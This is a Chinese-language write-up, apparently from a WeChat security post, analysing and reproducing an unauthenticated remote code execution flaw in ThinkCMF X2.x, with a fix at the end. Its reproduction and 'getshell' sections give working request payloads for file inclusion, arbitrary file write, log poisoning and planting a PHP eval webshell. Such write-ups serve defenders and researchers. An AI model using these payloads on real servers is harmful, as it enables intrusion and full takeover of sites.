> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/jmyGLRsH7NAH_KqiVH48uQ)

**ThinkCMF 简介**

ThinkCMF 是一款基于 PHP+MYSQL 开发的中文内容管理框架，底层采用 ThinkPHP3.2.3 构建。ThinkCMF 提出灵活的应用机制，框架自身提供基础的管理功能，而开发者可以根据自身的需求以应用的形式进行扩展

每个应用都能独立的完成自己的任务，也可通过系统调用其他应用进行协同工作。在这种运行机制下，开发商场应用的用户无需关心开发 SNS 应用时是如何工作的，但他们之间又可通过系统本身进行协调，大大的降低了开发成本和沟通成本

**漏洞介绍**

远程攻击者在无需任何权限情况下，通过构造特定的请求包即可在远程服务器上执行任意代码

**影响版本**

```
ThinkCMF X1.6.0
ThinkCMF X2.1.0
ThinkCMF X2.2.0
ThinkCMF X2.2.1
ThinkCMF X2.2.2
```

**环境搭建**

ThinkCMFX2.2.2 下载链接：https://pan.baidu.com/s/1rK1-_BLmH1VPXsIUfr1VUw 提取码：wuhw

将下载好的 ThinkCMF 解压后放在 WWW 目录下，然后浏览器访问即可看到安装页面

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPmR32ZuEKFRFGFIGeF2WVjfn78LgwdwsapmncBnjQB1UxicGXrTby6pwg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPmN3ic80Gcve8u6mcmZHxnZicQhyyAZZ0bCyBibXflHp5S8krNQFNPxcAAg/640?wx_fmt=png)

安装好之后访问页面为

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPmWNdZVztcnWbhbZFPf8D6huMet4ibm0v3wEsXlVbb0Sy9ocG1dqYDtKA/640?wx_fmt=png)

**漏洞分析**

首先打开 index.php 文件，查看程序的项目路径，可以看到项目路径在 application 目录下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPmteIyDic2DosOiaia1Z90jialu5Ke78wfoPQRHhXgvTicrcHYlGJzFibrB8Pg/640?wx_fmt=png)

在项目路径下找到入口分组的控制器类选择 IndexController 控制器类打开，可以知道继承了 HomebaseController，通过 gma 参数指定分组模块方法，这里可以通过 a 参数直接调用 PortalIndexController 父类 (HomebaseController) 中的一些权限为 public 的方法

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPmrXV4DS3oXf9TZlaFUQZYvhLLaGNMQlowoeesYHIrFQwIR6It7oMzPA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPmZiaHYqxPoQxfGn36ZNDfWEibaWEYPoIMhQW9MXl1v5ArJ4tm65Uico1cQ/640?wx_fmt=png)

可以看的的 public 方法里就有 display()、fetch(), 还有方法作用及参数含义  

display 函数 (**可以自定义加载模版，通过 $this->parseTemplate 函数根据约定确定模版路径，如果不符合原先的约定将会从当前目录开始匹配**) 的作用是加载模板和页面输出，所对应的参数为：templateFile 为模板文件地址，charset 模板字符集，contentType 输出类型，content 输出内容

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPmxmBib9qFgofumN3vS81HUe56ku8lR9bvMu4FD4O2pOdav2sggOzRtibA/640?wx_fmt=png)

templateFile 参数会经过 parseTemplate() 方法处理  
在 applicationCommonControllerAdminbaseController.class.php 的 parseTemplate() 方法如下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPm6LibSJyYfnnubKKO8rgG98ZN3bzpoGGmdmT2hLWtOibcI5TsNjibia6PZQ/640?wx_fmt=png)

parseTemplate() 方法作用：判断模板主题是否存在，当模板主题不存在时会在当前目录下开始查找，形成文件包含

构造的 payload 为 ：index.php?a=display&templateFile=README.md

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPmqSopicSbLFiczwiaPZVGtD7ibV1wm4ZTuZQSO03ia7UXd8icUib3mAOFoia8lg/640?wx_fmt=png)

这里 fetch 函数的三个参数分别对应模板文件，输出内容，模板缓存前缀。利用时 templateFile 和 prefix 参数可以为空，在 content 参数传入待注入的 php 代码即可

**漏洞复现**

1. 通过构造 a 参数的 display() 方法，实现任意内容包含漏洞  

```
?a=display&templateFile=README.md
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPmg1wiaUJNW2feLUmvvWeLl7Gc3iaT6qb3QoQicanyJJvHQib2pC5mgGNXmg/640?wx_fmt=png)

2. 通过构造 a 参数的 fetch() 方法，在不需要知道文件路径的情况下就可以实现任意文件写入

```
?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('1.php','<?php phpinfo(); ?>')</php>
```

执行 paylaod，如果页面是空白的，则说明可能写入成功

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPmK0KwzopkAvm0F5vsFc8qiaeXZPicnADzsysy4vvJC78pWicLibiaTFl5Tkg/640?wx_fmt=png)

3. 访问写入的文件 1.php，发现成功写入文件  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPm5kBddhqXOZ7x1g5wb1LPUFWeib2A7ibQQhLzAcJ3uUEJ5TDanicK40PSg/640?wx_fmt=png)

**ThinkCMF 缓存 getshell**

```
?a=display&templateFile=<?php file_put_contents('shell.php','<?php+eval($_POST["6666"]);?>');die();?>
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPmmfaTI11vNPP9pZnvLV2g9zpz3sPmmTTmAhQhDwCfxxhAHLJtw6asNw/640?wx_fmt=png)

****有两种方式可以 getshell****

****第一种方法****

```
http://target.domain/?a=display&templateFile=data/runtime/Logs/Portal/YY_MM_DD.log
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPmZQkygccOph9fEibKXROVuvswzrrwZia6dcniaxiarbG5AM2ib3QCM2Ry5qA/640?wx_fmt=png)

发送请求，thinkphp 生成的日志的格式为 年 - 月份 - 日期 (请求的日期)  

```
http://target.domain/?a=display&templateFile=<?php eval($_POST["6666"]);?>
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPmAoMcfoNEoCyEeiapC9ePttFMiaxdBuh37pfSOyWGS00Dj2r8NRoRP0uw/640?wx_fmt=png)

可以看到已经成功创建了 shell.php 文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPmZqeepaWQMDeiaDbm7lWQsU3qPCMic1zZWnKL6z9AJGQwLIPvs9AA4OfQ/640?wx_fmt=png)

然后使用蚁剑成功连接

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPmO4nKBHDSb00ibliaFcjOTic1nHZJrabnNUsrdORXwAYc5rXwxHG2BQnFA/640?wx_fmt=png)

**第二种方法**

发送以下请求  

```
http://target.domain/?a=display&templateFile=data/runtime/Logs/Portal/YY_MM_DD.log
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPm4NyXOgGFxNU5ostia7V5f5jNpPkEfMiaibSM9icD7t7oYhjC6nd0eiakphQ/640?wx_fmt=png)

然后直接使用一句话管理工具连接

```
http://target.domain/?a=display&templateFile=data/runtime/Logs/Portal/YY_MM_DD.log
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPmWZsyk1xMuic0cS1Zp9SoVOHqV3f2S3yktrWAC7KDPjOPeEAWuM6LBaw/640?wx_fmt=png)

**修复方法**

将 HomebaseController.class.php 和 AdminbaseController.class.php 类中 display 和 fetch 函数的修饰符改为 protected